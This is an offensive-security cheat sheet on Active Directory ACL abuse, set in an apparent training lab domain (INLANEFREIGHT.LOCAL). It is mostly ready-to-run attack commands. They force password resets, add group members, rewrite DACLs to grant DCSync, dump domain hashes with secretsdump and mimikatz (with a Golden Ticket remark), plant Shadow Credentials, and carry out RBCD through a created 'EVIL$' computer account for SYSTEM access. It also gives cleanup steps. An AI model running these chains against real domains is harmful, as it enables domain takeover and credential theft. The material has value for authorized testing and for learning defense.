---
title: ACL Abuse
---

ACL misconfigurations are not CVEs — scanners miss them. They're administrator mistakes layered over years of delegation, nested groups, and "temporary" fixes. Chain the right ACEs and a help-desk user becomes Domain Admin without dropping a single binary.

> [!tip] Mental model
> Every AD object has a **DACL** made of **ACEs**. Each ACE binds a **SID** (who) to an **access mask** (what they can do) on that object. Find ACEs where "who" is a principal you control and "what" lets you pivot — then walk the graph.

---

## Dangerous ACEs — Primitives & Abuses

| ACE | Target | What it gives you |
|---|---|---|
| **GenericAll** | user | Full control → reset pwd, set SPN, write `msDS-KeyCredentialLink`, add to groups |
| **GenericAll** | group | Add arbitrary members (incl. yourself) |
| **GenericAll** | computer | LAPS read (if ext.right present), RBCD, Shadow Credentials |
| **GenericWrite** | user | Write non-protected attrs → SPN (Kerberoast), `userAccountControl` (AS-REP) |
| **GenericWrite** | group | Treated as AddMember in some tools |
| **WriteDACL** | any | Grant yourself any further ACE (e.g. DCSync rights) then abuse |
| **WriteOwner** | any | Set owner → implicit `WriteDACL` → full control |
| **AddMember** / **Self-Membership (AddSelf)** | group | Add principal to the group |
| **ForceChangePassword** | user | Reset password without knowing the old one |
| **ReadLAPSPassword** / `ms-Mcs-AdmPwd` read | computer | Cleartext local admin password |
| **AllExtendedRights** | user | Includes ForceChangePassword + ReadLAPS |
| **AllExtendedRights** | domain | Includes `DS-Replication-Get-Changes[-All]` → **DCSync** |
| **DS-Replication-Get-Changes** + **-All** | domain root | **DCSync** |
| **WriteProperty** on `servicePrincipalName` | user | Targeted Kerberoast |
| **WriteProperty** on `msDS-KeyCredentialLink` | user/computer | **Shadow Credentials** → PKINIT TGT |
| **WriteProperty** on `msDS-AllowedToActOnBehalfOfOtherIdentity` | computer | **RBCD** → S4U2self/proxy → SYSTEM |

## Enumerating ACLs

### BloodHound (primary)
Collect with `SharpHound`/`bloodhound.py`, then run:
- **Shortest Paths to Domain Admins** — shows the chain for you.
- Mark any principal you control as **Owned**, then **Shortest Paths from Owned**.
- Node queries: `Outbound Object Control` → every ACE you hold on anything.
- Edges to care about: `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `AddMember`, `ForceChangePassword`, `AllExtendedRights`, `GetChanges`, `GetChangesAll`, `ReadLAPSPassword`, `AddKeyCredentialLink`, `AllowedToAct`.

### PowerView (Windows)
```powershell
Import-Module .\PowerView.ps1

# What does my user have power over?
$sid = Convert-NameToSID wley
Get-DomainObjectACL -Identity * -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}

# Who has rights OVER my target?
Get-DomainObjectACL -Identity adunn -ResolveGUIDs

# Broad sweep (noisy)
Find-InterestingDomainAcl -ResolveGUIDs
```

### AD Module / RSAT
```powershell
foreach ($u in Get-Content ad_users.txt) {
  Get-Acl "AD:\$(Get-ADUser $u)" |
    Select -ExpandProperty Access |
    ? {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
}
```

### Linux
```bash
# Impacket — read/edit DACLs remotely
dacledit.py -action read -target adunn 'INLANEFREIGHT.LOCAL/forend:Pass123!'
# bloodhound-python for collection
bloodhound-python -u forend -p 'Pass123!' -d inlanefreight.local -ns 172.16.5.5 -c All
```

## Abuse Chains

### Operator credential object (used in all PowerView abuse)
```powershell
$sec  = ConvertTo-SecureString 'Pass123!' -AsPlainText -Force
$Cred = New-Object Management.Automation.PSCredential('INLANEFREIGHT\wley',$sec)
```

### ForceChangePassword → logon as target
```powershell
$new = ConvertTo-SecureString 'Pwn0dByACL!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $new -Credential $Cred -Verbose
```
Linux: `net rpc password damundsen 'Pwn0dByACL!' -U 'INLANEFREIGHT\wley%Pass123!' -S dc01`.

### AddMember / GenericWrite on group → nested privilege
```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose
# Nested into "Information Technology" → inherits its rights over adunn
```
Linux: `net rpc group addmem 'Help Desk Level 1' damundsen -U '...'`.

### WriteOwner → self → full control
```powershell
# 1. Take ownership
Set-DomainObjectOwner -Identity target -OwnerIdentity attacker -Credential $Cred
# 2. Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity attacker -Rights All -Credential $Cred
# 3. Abuse like GenericAll
```

### WriteDACL → grant DCSync rights → DCSync
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=inlanefreight,DC=local' `
  -PrincipalIdentity attacker -Rights DCSync -Credential $Cred
```
Then dump:
```bash
# Linux
secretsdump.py -just-dc INLANEFREIGHT/attacker@172.16.5.5
secretsdump.py -just-dc-user krbtgt INLANEFREIGHT/attacker@172.16.5.5
```
```
# Windows
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
```
`krbtgt` hash = Golden Ticket. `administrator` hash = instant DA via PtH.

> [!warning] DCSync prerequisites
> Principal needs **both** `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the domain root. Confirm:
> ```powershell
> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
>   ? {$_.ObjectAceType -match 'Replication-Get'} |
>   ? {$_.SecurityIdentifier -match $sid}
> ```

### Reversible encryption bonus
Accounts with UAC bit `ENCRYPTED_TEXT_PWD_ALLOWED` (128) store passwords RC4-encrypted — `secretsdump` decrypts them to **cleartext** in `*.ntds.cleartext`. Enumerate:
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

## Shadow Credentials (`msDS-KeyCredentialLink`)

Write a key credential onto a target user/computer → authenticate as them via **PKINIT** with the paired certificate. Requires `GenericAll` / `GenericWrite` / `WriteProperty` on `msDS-KeyCredentialLink`. Works against users and computers, no password reset — far stealthier than ForceChangePassword.

**Windows — Whisker:**
```powershell
.\Whisker.exe add /target:adunn
# → outputs a Rubeus asktgt /certificate: base64 blob
.\Rubeus.exe asktgt /user:adunn /certificate:MIIJuAIBAz... /password:<pfxpw> /ptt
```

**Linux — pywhisker + gettgtpkinit:**
```bash
pywhisker.py -d inlanefreight.local -u forend -p 'Pass123!' --target adunn --action add
gettgtpkinit.py -cert-pfx adunn.pfx -pfx-pass <pw> inlanefreight.local/adunn adunn.ccache
export KRB5CCNAME=adunn.ccache
# Grab the NT hash from PKINIT via UnPAC-the-hash
getnthash.py -key <AS-REP key from gettgtpkinit> inlanefreight.local/adunn
```
Cleanup: `pywhisker ... --action remove`.

## Resource-Based Constrained Delegation (RBCD)

If you have `GenericAll`/`GenericWrite`/`WriteProperty` on a **computer** object, write your own controlled account into its `msDS-AllowedToActOnBehalfOfOtherIdentity`. Then **S4U2self + S4U2proxy** lets you request a service ticket to that computer **as any user** (including a DA) → SYSTEM on the host.

### Prereq: controlled computer account
Any domain user can create up to **`MachineAccountQuota`** computers (default 10):
```bash
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pwn123!' `
  -dc-host dc01 'INLANEFREIGHT.LOCAL/forend:Pass123!'
```

### Write RBCD
**Linux:**
```bash
rbcd.py -delegate-from 'EVIL$' -delegate-to 'VICTIM$' -action write `
  'INLANEFREIGHT/forend:Pass123!'
```

**Windows (PowerView):**
```powershell
$comp = Get-DomainComputer EVIL
Set-DomainRBCDOwner -Identity VICTIM -DelegateFrom $comp.SamAccountName -Credential $Cred
# or manual:
Set-DomainObject VICTIM -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$sd} -Credential $Cred
```

### S4U → service ticket → own the host
```powershell
# Get EVIL$'s RC4 hash
.\Rubeus.exe hash /password:Pwn123! /user:EVIL /domain:inlanefreight.local

# S4U2self + S4U2proxy — impersonate Administrator to CIFS on VICTIM
.\Rubeus.exe s4u /user:EVIL$ /rc4:<HASH> /impersonateuser:administrator `
  /msdsspn:cifs/VICTIM.inlanefreight.local /ptt
dir \\VICTIM.inlanefreight.local\C$
```

Linux equivalent:
```bash
getST.py -spn cifs/victim.inlanefreight.local -impersonate administrator `
  -dc-ip 172.16.5.5 'INLANEFREIGHT/EVIL$:Pwn123!'
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass victim.inlanefreight.local
```

## Cleanup Discipline

> [!warning] Order matters
> Reverse your chain in **LIFO** order. If you change a password, add a group member, then write an SPN — remove the SPN first, then the group member, then restore the password. Otherwise you can lock yourself out of your own cleanup.

- Remove any SPN you wrote (`Set-DomainObject -Clear serviceprincipalname`).
- Remove added group members (`Remove-DomainGroupMember`).
- Remove added ACEs (`Remove-DomainObjectAcl`).
- Remove `msDS-KeyCredentialLink` entries (`Whisker remove` / `pywhisker --action remove`).
- Clear `msDS-AllowedToActOnBehalfOfOtherIdentity` (`rbcd.py -action flush`).
- **Do not** reset passwords you changed unless you know the original — note it in the report instead.

## Checklist

- [ ] BloodHound collected; owned principal marked; shortest paths reviewed.
- [ ] Enumerated outbound object control for every controlled principal.
- [ ] Identified any GenericAll/Write, WriteDACL, WriteOwner, AddMember, FCP edges.
- [ ] Checked for `GetChanges` + `GetChangesAll` → DCSync opportunity.
- [ ] Checked computer objects for `WriteProperty` on KeyCred / AllowedToAct.
- [ ] Executed abuse chain with least-noisy primitive available.
- [ ] Cleaned up all writes in reverse order; documented anything not reversible.
